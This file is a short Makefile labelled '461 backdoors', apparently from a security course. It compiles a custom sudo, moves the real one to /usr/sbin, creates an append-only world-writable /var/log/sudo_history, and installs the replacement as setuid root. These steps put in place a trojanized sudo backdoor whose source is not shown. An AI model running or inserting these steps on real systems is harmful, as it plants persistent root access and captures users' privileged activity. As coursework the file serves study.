##
# 461 backdoors
#
# @file
# @version 0.1

install: install-sudo

install-sudo: dist/sudo
	mkdir -p dist
	sudo mv /usr/bin/sudo /usr/sbin/sudo
	/usr/sbin/sudo touch /var/log/sudo_history
	/usr/sbin/sudo chmod 622 /var/log/sudo_history
	/usr/sbin/sudo chattr +a /var/log/sudo_history
	/usr/sbin/sudo chmod 4111 /usr/bin/sudo
	/usr/sbin/sudo chown 'root:root' /usr/bin/sudo
	/usr/sbin/sudo cp dist/sudo /usr/bin/sudo

dist/sudo: src/sudo.c
	gcc -std=gnu99 -o dist/sudo src/sudo.c

# end
